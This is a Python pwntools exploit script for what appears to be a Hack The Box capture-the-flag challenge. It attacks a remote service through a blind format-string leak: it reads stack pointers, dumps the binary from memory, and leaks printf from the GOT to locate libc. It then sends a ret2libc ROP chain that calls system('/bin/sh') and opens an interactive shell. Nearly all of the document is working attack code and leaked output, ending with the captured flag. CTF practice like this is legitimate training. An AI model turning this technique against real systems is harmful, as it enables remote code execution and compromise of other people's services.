#Format String Dump Binary!!!
#String Format Dump Binary!!!

from pwn import *
from struct import *

#context.log_level = 'debug'

ip, port = '167.99.205.156', 30616
#io = remote(ip, port)

def detect():
        for i in range(64):
                io.recvuntil('>')
                io.sendline(b'%'+str(i+1).encode()+b'$p')
                buf = io.recvline().decode().strip().split(' ')[0]
                print(str(i+1)+' : '+buf)

#detect()

'''
1 : 0x6e
2 : 0xfffffff4
3 : 0x10
4 : 0x1d
5 : 0x7f7433b664c0
6 : 0x7fff31cddfb8
7 : 0x100000000
8 : 0xa70243825
9 : (nil)
10 : 0x7fff00000000
11 : 0x100000000
12 : 0x556ca069e400
13 : 0x7f7433571bf7
14 : 0x1
15 : 0x7fff31cddfb8
16 : 0x100008000
17 : 0x556ca069e2ef
18 : (nil)
19 : 0x585531379ff23ebb
20 : 0x556ca069e160
21 : 0x7fff31cddfb0
22 : (nil)
23 : (nil)
24 : 0xd72127fea323ebb
25 : 0xc64174a60ac3ebb
26 : 0x7fff00000000
27 : (nil)
28 : (nil)
29 : 0x7f74339518d3
30 : 0x7f7433937638
31 : 0x7b1fd
32 : (nil)
33 : (nil)
34 : (nil)
35 : 0x556ca069e160
36 : 0x7fff31cddfb0
37 : 0x556ca069e18e
38 : 0x7fff31cddfa8
39 : 0x1c
40 : 0x1
41 : 0x7fff31cdeea7
42 : (nil)
43 : 0x7fff31cdeeb2
44 : 0x7fff31cdeeba
45 : 0x7fff31cdeeca
'''
#overflow length 64

def leak_pointer_to_main():
	'''12th pointer is one from the main()'''
	io.sendline(b"%12$p")
	sleep(0.3)
	io.recvuntil(b"> ")
	leak_all = io.recv()
	leak = leak_all.decode().split("\n")[0]
	print("Leaked main address: " + leak)
	return int(leak,16)

def search_elf_magic_bytes(leaked_main,addr):
	'''Search through the process memory to find ELF magic bytes: \x7fELF.'''
	#%8$p is the repeated string pararmeter of the first input string, so we print from the 9th pararmter:
	#%9$s+address, will print out string on the address
	while True:
		leak_part = b"%9$sEOF" + b"\x00"
		try:
			io.sendline(leak_part + p64(leaked_main + addr))
			res = io.recvuntil(b"1. Scream.\n2. Run outside.\n> ")
			leak = res.split(b"EOF")[0] + b"\x00"
			print("Deferenced pointer: " + leak.decode("unicode_escape"))
			if b"\x7FELF" in leak:
				magic_bytes = leaked_main + addr
				print("MAGIC BYTES FOUND @: " + hex(magic_bytes))
				return magic_bytes, False
				break
			addr -=0x100
		except:
			addr -=0x100
			io.close()
			return addr, True

elf_found = True
addr = 0
leaked_main = 0
while elf_found:
	io = remote(ip,port)
	print("CURRENT ADDRESS = " + hex(addr))
	leaked_main = leak_pointer_to_main() + addr
	addr, elf_found = search_elf_magic_bytes(leaked_main,addr)
start_main_addr = addr

def dump_binary(magic_bytes_addr):
	'''Dump the binary data'''
	base = magic_bytes_addr
	leak,leaked = bytearray(),bytearray()
	offset = len(leaked)
	while offset <= 0x5000:
		with open("leak.bin", "ab") as f:
			addr = p64(base + len(leaked))
			leak_part = b"%9$sEOF\x00"
			io.sendline(leak_part + addr)
			res = io.recvuntil(b"1. Scream.\n2. Run outside.\n> ")
			leak = res.split(b"EOF")[0] + b"\x00"
			leaked.extend(leak)
			print("Address: " + hex(unpack("<Q",addr.ljust(8,b"\x00"))[0]) + " - Offset: " + str(offset) + ":" + hex(offset)+ " - Leaked data: " + leak.decode("unicode_escape"))

			f.write(leak)
			f.flush()
			offset = len(leaked)

# Dump binary:
#dump_binary(start_main_addr)

# After reversing - 0x00003fa8
def leak_printf_got(start_main_addr):
	'''Leak printf@GOT - which is dynamically linked during runtime'''
	#ninja -> sub_1100 -> jmp data_3fa8 -> 0x3fa8
	printf_GOT = 0x00003fa8
	printf_addr = start_main_addr + printf_GOT
	print("Leaked printf address: " + hex(printf_addr))
	leak_part = b"%9$sEOF\x00"
	io.sendline(leak_part + p64(printf_addr))
	res = io.recv() #until(b"1. Scream.\n2. Run outside.\n> ")
	leak = res.split(b"EOF")[0] + b"\x00"
	libc_printf = hex(u64(leak.ljust(8,b"\x00")))
	print("[!!!] Leaked libc printf : " + libc_printf)
	return int(libc_printf,16)

libc_printf = leak_printf_got(start_main_addr)

#https://libc.blukat.me/ search with printf f70, download and try the libc.so one by one
'''
one_gadget libc6_2.27-3ubuntu1.4_amd64.so
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

0x00000000000215bf : pop rdi ; ret
ROPgadget --binary libc6_2.27-3ubuntu1.4_amd64.so --string /bin/sh
Strings information
============================================================
0x00000000001b3e1a : /bin/sh

'''

libc = ELF('./libc6_2.27-3ubuntu1.4_amd64.so')
#libc = ELF('./libc6_2.24-9ubuntu2.2_i386.so')
#libc = ELF('./libc6_2.24-9ubuntu2_i386.so')
libc_base = libc_printf - libc.sym['printf']
libc.address = libc_base
offset = 64+8

payload = offset*b'A'
payload += p64(libc_base + 0x00000000000008aa) #ret #alignment!!! Success after adding this alignment!!!
payload += p64(libc_base + 0x00000000000215bf) #pop rdi; ret
payload += p64(libc_base + 0x1b3e1a) #/bin/sh
payload += p64(libc.sym['system'])

#rop_libc = ROP(libc)
#rop_libc.call((rop_libc.find_gadget(['ret']))[0])  #!!Padding/16 bytes!
#rop_libc.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])
#payload = offset*b'A' + rop_libc.chain()

#io.recvuntil('>')
io.sendline(b'1')
io.recvuntil('>>')
io.sendline(payload)
io.interactive()

'''
def get_rce(libc_printf):
	printf_libc_offset = 0x0000000000064f70
	one_gadget = 0x4f432
	rce = libc_printf - printf_libc_offset + one_gadget
	print("CALCULATED RCE: " + hex(rce))
	io.sendline(b"1")
	io.recv()
	#io.send(b"A"*64 +p64(0x0000000000064f70) + p64(rce) + b"\x00"*0x70)
	io.send(b"A"*(64+8) + p64(rce) + b'\x00'*0x48)
	io.interactive()

get_rce(libc_printf)
'''

#HTB{bl1nd_R0p_1s_c0ol_a1nt_1t?}
